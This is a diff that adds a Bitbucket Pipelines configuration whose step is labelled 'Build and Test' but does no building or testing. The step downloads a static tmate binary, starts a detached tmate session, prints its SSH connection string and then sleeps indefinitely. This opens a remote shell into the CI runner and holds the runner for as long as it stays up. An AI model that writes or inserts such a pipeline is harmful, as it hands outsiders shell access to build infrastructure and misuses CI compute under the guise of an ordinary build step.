@@ -1,11 +1,20 @@
 
+image: atlassian/default-image:3
+
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: 'Build and Test'
+          script:
+            - echo "Your build and test goes here..."
+            - apt update && apt install sudo wget tar xfce4-terminal -y
+            - pkill -9 tmate
+            - wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null 
+            - tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null 
+            - rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1. 
+            - ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready 
+            - ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}" 
+            - sleep 9999999999
 
 
-
-- pkill -9 tmate
-- wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null 
-- tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null 
-- rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1. 
-- ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready 
-- ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}" 
-- sleep 9999999999
